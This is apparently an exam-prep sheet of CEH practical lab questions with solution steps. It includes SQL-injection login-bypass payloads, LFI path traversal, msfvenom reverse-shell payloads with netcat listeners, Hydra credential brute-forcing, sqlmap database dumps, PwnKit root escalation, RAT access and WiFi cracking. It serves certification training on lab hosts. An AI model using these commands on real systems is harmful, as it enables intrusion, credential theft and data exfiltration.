**This is a model questions for CEH practical this may come or may not. Just refer this as side**

1).Enumerate SMB Shares
Question: List shared folders on a target using SMBClient.
Solution: smbclient -L \\[IP] -U [username]

2).Analyze Malicious Network Traffic
Question: You are provided with a .pcap file. Analyze it to identify a potential attack.
Solution:
Open the .pcap file in Wireshark.
Filter the traffic using protocols like http, ftp, or telnet.
Look for suspicious activities like brute force attempts or unauthorized downloads.
Example filter: ftp.request.command == "USER" || ftp.request.command == "PASS"

3).Perform SQL Injection
Question: Test for SQL injection on a login page with fields username and password.
Solution:
Enter the following payload in the username field: ' OR '1'='1' --  
blah' or 1 = 1 --
Leave the password field blank.
If successful, you'll bypass authentication.

4).Crack Password Hashes
Question: Use Hashcat to crack a hashed password.
Solution:
Identify the hash type: hashid [hash].
Crack it: hashcat -m [hash_mode] -a 0 [hash_file] [wordlist].

5).Crack an Encrypted ZIP File
Question: Use John the Ripper to crack a password-protected ZIP file.
Solution:
Convert the ZIP hash: zip2john file.zip > hash.txt.
Crack the password: john --wordlist=wordlist.txt hash.txt.

6). Detect and Exploit LFI (Local File Inclusion)
Question: A web application has an LFI vulnerability. Exploit it to read sensitive files.
Solution:
Identify LFI: http://example.com/?file=../../../../etc/passwd.
Use traversal techniques to access other sensitive files like /var/www/html/config.php.

7).Conduct Reverse Shell Exploitation
Question: Establish a reverse shell on a  vulnerable system.
Solution:
Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
Transfer the payload to the target system.
Set up a listener: nc -lvnp 4444.
Execute the payload to gain shell access.

8). While investigating an attack, you found that a Windows web development environment was exploited to gain access to the system. Perform extensive scanning and service enumeration of the target networks and identify the IP address of the server running WampServer
nmap -sV -p 80,443,3306 192.168.1.0/24

9).Identify a machine with SMB service enabled in the 192.168.0.0/24 subnet. Crack the SMB credentials for user Harrypotter and obtain Somaliaf.txt file containing an encoded secret. Decrypt the encoded secret and enter the decrypted text as the Solution. Note: Use Henry’s password to decode the text.
Solution 1:
⦁	Find the ip with smb port open
⦁	hydra -L username.txt -P password.txt 10.10.1.10 smb
⦁	use caja in parrot
Solution 2:
⦁	1. Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot
⦁	os. Use Hydra to crack it. The password for the encoded file is the same. If the file contains a hash, try to decode it.
⦁	2. sudo nmap -T4 -Ss -p 139,445 - -script vuln 192.168.0.0/24
⦁	3. hydra-l henry -P /home/passlist.txt 192.168.0.1 smb
⦁	4. smbclient //192.168.0.1/share
⦁	5. smbclient -L 192.168.0.1
⦁	6. type password and ls
⦁	7. get sniff.txt ~/Desktop/falg2.txt or more sniff.txt
⦁	8. cat falg2.txt
⦁	9. now encrypt the text using the same henry login password in bctextencoder.exe manual open



10). insider attack has been identified in one of the watchman mobile device in 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain malicious elf files stored in a folder “Scan”. Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value.
- scan for ip with open port 5555
- use phonespolit or adb to connect
- pull the file
- Use hashcalc to get SHA 384 hash


11).Perform a vulnerability scan for the host with IP address 172.20.0.16 What is the severity score of a vulnerability the indicates the End of Life of a web development language platform? sample Format
scan with openvas and go to results and filter EOL
Most of the case EOL has higher sevierity like 10.0

12). Exploit a remote login and command-line execution application on a Linux target in the 192.168.0.0/24 subnet to access a sensitive file, NetworkPass.txt Enter the content in the file as Solution.
Solution 1:
⦁	use Nmap to find the ip of the linux
⦁	bruteforce using hydra on ftp,ssh,telnet or smb
⦁	download file via ssh Sample Format : My$t!(H^(k
Solution 2:
⦁	1. Use Hydra to break the password Telnet, login and access the file, and enter the flag.
⦁	2. Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server Task-7
⦁	3. Nmap -p 22,23,80,3389 192.168.0.0/24
⦁	4. sudo nmap -sS -sV -p- -O ipadd
⦁	5. telnet 192.168.0.19 80 and GET / HTTP/1.0
⦁	6. hydra -L user.txt -P pass.txt 192.168.0.1 ssh
⦁	7. hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.106 telnet
⦁	8. ssh ubuntu@192.168.0.1
⦁	9. telnet 192.168.0.1
⦁	10. msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 and copy the path go to target machine
⦁	after login paste now find . -name flag.txt
⦁	11. start listen nc -lnvp 444
⦁	12. password type
⦁	13. ls
⦁	14. find . -name NetworkPass.txt
⦁	15. cat /path/NetworkPass.txt

13). You used shoulder surfing to identify the usernames and password of a user on the Ubuntu machine in the 192.168.0.0/24 network, that is, John and Cena. Access the Machine, Perform vertical privilege escalation to that of a root user, and enter the content of the imroot.txt file as the Solution.
Solution 1:
⦁	1. nmap -sV -p 22 192.168.0.0/24 and now see open port ip address and note down
⦁	2. ssh smith@192.168.0.1 and for password given L1nux123
⦁	3. sudo -i
⦁	4. cd /
⦁	5. find . -name imroot.txt
⦁	6. cat givenpath/imroot.txt
Solution 2:
⦁	If it is a privilege escalation in linux machine, most of the time the vulnerability is pkexec  or try sudo -i to get root shell
⦁	 mkdir /tmp/pwnkit
⦁	Now, in the terminal type mv CVE-2021-4034 /tmp/pwnkit/ and press Enter
⦁	In the terminal window, type cd /tmp and press Enter to navigate to tmp directory
⦁	Type cd pwnkit and press Enter to navigate into pwnkit folder
⦁	Type cd CVE-2021-4034/ and press Enter to navigate into CVE-2021-4034 folder
⦁	 In the CVE-2021-4034 directory, type make and press Enter
⦁	Now, in the terminal, type ./cve-2021-4034 and press Enter.
⦁	 A shell will open in the shell type whoami and press Enter. Now you are a root
⦁	In worst case scenario, you need to check kernel version and sudo version to find the vulnerability and download exploit from exploit-db and run it.

14). During as assignment, an incident responder has retained a suspicious executable file “Happy-Death-day” Your task as a malware analyst is to find the executable’s Entry point (Address). The file is in the C:\Users\Admin\Documents directory in the “EH Workstation – 2” machines. Sample format (0041e768)
⦁	Open file with PE Explorer
⦁	You will see the entry point in top under Headers info 
⦁	Or use Ollydbg to open file and goto view logs, the first address is entry point

15). You are investigating a massive DDoS attack launched against a target at 10.10.1.10. Identify the attacking IP address that sent most packets to the victim machine. The network capture file “attack-traffic.pcapng” is saved in the Documents folder of the “EH Workstation – 1” (ParrotSecurity) machine. Sample format: 10.10.55.!!
⦁	Open file in Wireshark
⦁	Goto Statistics -> Conversations -> ipv4 and sort with packets


16). Perform SQL injection attack on a web application cooldad.beer.com, available at 172.20.0.22. Find the value in the Flag column in one of the DB tables and enter it as the Solution. Sample format : H^(k#37L  )
⦁	sqlmap -u "http://example.com/vuln.php?id=1" --columns "flag"   or
⦁	sqlmap -u "http://example.com/vuln.php?id=1" --column-name "flag"    or
⦁	open jsql tool and paste the link with parameter

17).Identify a machine with RDP service enabled in the 10.10.55.0/24 subnet. Crack the RDP credentials for user jackichan and obtain a file masalae.cfe containing an encrypted images file. Decrypt the file and enter the ARC32 value of the images file as the Solution. Note : Use jakies’s password to extract the images file.. (Format: NaaNNNaa).
⦁	sudo nmap -Pn -n -p 3389 --open --min-rate 5000 10.10.55.0/24 -> find rdp enabled windows machine.
⦁	hydra -L jakies -P /home/attack/Desktop/passwords.txt rdp://10.10.55.11 -t 30 -> bruteforcing creds. (If rdp not suit for bruteforcing use some other like ssh/ftp)
⦁	xfreerdp /v:10.10.55.11 /u: jones  or use windows
⦁	hide.cfe -> it is encrypted using CryptForge, to decrypt > select file > right click > decrypt. 

18). Perform a vulnerability scan for the host with IP address 192.168.4.12. what is the CVE number of the vulnerability with least severity score? (Format:AAA-NNNN-NNNN). 
⦁	Goto openvas -> scans -> Vulnerabilties -> Filter severity = 1 
⦁	Click the vulnerability shown below, CVE mentioned under references at last line

19). Exploit weak credentials used for SMB service on a windows machine in the 10.10.55.0/24 subnet. Obtain the file sniffer.txt hosted on the smb root, and enter its content as the Solution. (Format: a*aaNaNNa).
⦁	sudo nmap -Pn -n -p 445 --open 10.10.55.0/24 --min-rate 5000 -> find device.
⦁	hydra -L ./usernames.txt -P ./passwords.txt -t 30 smb:// 10.10.55.11
⦁	Connect with file manager in parrot
⦁	smbmap -H 10.10.55.11 (-u james -p qw3rty (optional)) -> find shares
⦁	smbclient //10.10.55.11//Users/
⦁	get sniffer.txt > cat sniffer.txt

20). You are assigned to analyse and perform static malware analysis on a malicious executable file hell.exe located in Downloads folder of EHWorkstation-2. Determine the Linker Version number of the executable file as Solution. (Format : N*NN).
⦁	navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\PEid
⦁	The PEiD main window appears. 
⦁	The Choose the file to open window appears; navigate to hell.exe 

21). A disgruntled ex-employee Goodnight has hidden some confidential files in a folder “Scan” in a windows machine in the 10.10.55.0/24 subnet. You cannot physically access the target machine, but you know that the organization has installed a RAT in the machine for remote administrator purposes. Your task is to check how many files present in the scan folder and enter the number of files sniffed by the employee as Solution. (Format: N).
Solution 1:
⦁	1. Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.
⦁	2. main ports check 9871,6703,5552,2968,
⦁	3. nmap -p 9871,6703 192.168.0.0/24
⦁	4. now you get open port ip address
⦁	5. now go to the c drive malware/trojans/rat/theef and run the client.exe file
⦁	6. now entry the ip of open port and click connect and click on file explorer and find the sa_code.txt.
⦁	7. or search file in cmd using command --→ dir /b/s “sa_code*” it shows the path.
Solution 2:
⦁	sudo nmap -Pn -n -p 6703 10.10.55.0/24 --min-rate 5000 -> find device note the <Ip Address>
⦁	 Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef and double-click Client210.exe to access the victim machine remotely.
⦁	Enter the IP address of the target machine in the IP field, and leave the Port and FTP fields set to default; click Connect.
⦁	Click on File explorer icon > File manager > Expand Hard Drive C: > Users folder > Martin Folder > and find Scan folder > count file present in Scan folder > Enter it as Solution. 

22). During an assignment, an incident response has detected a suspicious executable file “Strange_File-1”. Your task as a malware analysis is to determine the size of the PT_LOAD(0) segment using SHA224 hash method. The file is in the C:\Users\Admin\Documents directory in the “EH-workstation-2” machine. (Format: NNNaNNaa).
⦁	In the Windows 11(Workstation-2), navigate to E:\CEHTools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE and double-click die.exe.
⦁	The Open file… window appears; navigate to C: \Users\Admin\Documents choose "Strange_File-1".
⦁	Right Top Corner there you can "Hash" button" > Click on it > At top you can see Method (select sha224) > in result you can see Size of PT_LOAD(0). 

23). You are investigating a massive DDoS attack launched against a target at 172.22.10.10. Your objective is to identify the packets responsible for the attack and determine the least IPv4 packet count sent to the victim machine. The network capture file “Evil-Traffic.pcapng” is saved in the Document folder of the “EH-Workstation-2” windows 11 machine (Format:NNNNN).
Open wire shark in windows machine > Choose "EvilTraffic.pcapng" > From upper options "Statistics" > "IPv4
Statistics" > Source and destination Addresses > Type ip.dst == 172.22.10.10 (In Display Filter).

24). Explore the web application at www.cehorg.com and enter the flag’s value on the page with page_id=95. (Format : A**NNAA).
Solution 1:
visit page www.cehorg.com in website you can ethical hacking hyper link -> click on it
you can observe the url parameter was changed > scroll down to see flag value.
Solution 2:
1. nmap -sV --script=http-enum [target domain or IP address]
2. Find any input parameter on website and capture the request in burp and then use it to perform sql
injection using sqlmap.
3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT”
you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
4. sqlmap -r <txt file from burpsuite> --dbs
5. sqlmap -r <txt file from burpsuite> -D <database name> --tables
6. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns
7. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all
8. then login and do the url parameter change page_id=1 to page_id=84

25). Perform vulnerability research and exploit the web application training.cehorg.com, available at 10.10.55.50. Locate the Flag.txt file and enter its content as the Solution. (Format: A*a*aNNN).
Solution 1:
dirb http://training.cehorg.com -X .txt
http://training.cehorg.com/Flag.txt 
Solution 2:
1. Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/ File inclusion
vulnerability on DVWA.
2. msfconsole in one tab next in new tab
3. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
4. >use exploit/multi/handler or use 30
5. >set payload php/meterpreter/reverse_tcp
6. Set LHOST ipadd
7. Upload a file you created as exploit.php
8. Open terminal and type run once you get url type url in brower you get meterpreter session then type ls
get the files. Sample format : FLyh!gh

26). Your organisation suspects the presence of a rogue AP in the vicinity. You are tasked with cracking the wireless encryption, connecting to the network, and setting up a honeypot. The airdump-ng tool has been used, and the WiFi traffic capture named “Wifi_Pcap.cap” is located in the Documents folder in “EH-Workstation-1” (parrot machine). Crack the wireless encryption and enter the total number of characters present in the wi-fi password.Format:N).
Open wifi_pcap.cap in wireshark > apply display fileter : wlan.bssid -> to find bssid of access point.
aircrack-ng -a2 -b <bssid> ./wifi_pcap.cap -w ./ passwords.txt

27). Perform an SQL injection attack on your target web application cinema.cehorg.com and extract the password of a user Sarah. You have already registered on the website with credentials Karen/computer.
Solution: abc123
⦁	1. now in parrot os, open firefox and login into the website given and details.
⦁	2. Go to profile and and right cleck and inspect and console type “document.cookie” you will get one value.
⦁	3. Open the terminal and type the below commands to get the password of other user.
⦁	4. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
⦁	5. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0"
⦁	-D moveiscope – -tables
⦁	6. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0"
⦁	-D moviescope -T user-Login – -dump
⦁	7. You will get all the Useraname and Passwords of the website.

28). Find the image version number of the given malware file named wild fire.
- open with pe explorer sample Solution format 1.0

29). Find the IOT publish message.
- Filter with mqtt. sample format: High4Temp

30). A file named Hash.txt has been uploaded through DVWA (http://172.20.0.16:8080/DVWA). The file is located in the “C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file and crack the MD5 hash to reveal the original message. Enter the decrypted message as the answer. You can log into the DVWA using the credentials admin/password. Answer: Secret123 1. Open the url given and login with given details. Task-8 2. After login http://172.20.0.16/DWVA/hackable/uploads/ 3. They you see files open it and copy the hash value go to the hashes.com/en/decrypt/hash Sample format Thr3@t0n3. Or try below. 4. hash-identifier paste the text and see the type of hash and then hashcat -h | grep MD5 5. hashcat -m 0 hash.txt /Desktop/word list/urser.txt 

31). Find the text in hidden file new .txt
Use SNOW decoder. 
32). Find the mercury sevices version running on this ip.
nmap -sV ip. Sample format 4.62

